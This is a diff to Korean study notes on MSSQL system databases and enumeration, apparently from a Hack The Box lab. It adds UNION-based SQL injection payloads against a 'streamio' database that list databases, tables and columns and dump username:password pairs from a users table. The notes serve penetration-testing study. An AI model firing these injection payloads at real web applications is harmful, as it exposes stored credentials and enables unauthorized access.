@@ -241,6 +241,13 @@ MSSQL 설치 시 기본으로 생성되는 시스템 데이터베이스:
 1> SELECT name FROM master.dbo.sysdatabases
 2> GO
 
+select 1,name,DB_NAME(),4,5,6 from master..sysdatabases
+SELECT db_name(0)
+SELECT db_name(1)
+
+-- 테이블의 이름과 Object ID 조회
+select 1,name,id,4,5,6 from streamio..sysobjects where xtype='U';-- -
+
 -- 특정 데이터베이스 선택
 -- USE 명령으로 작업 대상 데이터베이스 변경
 1> USE htbusers
@@ -251,10 +258,14 @@ MSSQL 설치 시 기본으로 생성되는 시스템 데이터베이스:
 1> SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES
 2> GO
 
+select 1,name,id,4,5,6 from streamio..syscolumns where id in (885578193,901578250);-- -
+
 -- 테이블 데이터 조회
 -- 실제 저장된 데이터 확인
 1> SELECT * FROM users
 2> go
+
+SELECT 1,CONCAT(username,':',password),3,4,5,6 from streamio..users;-- -
 ```
 
 ---
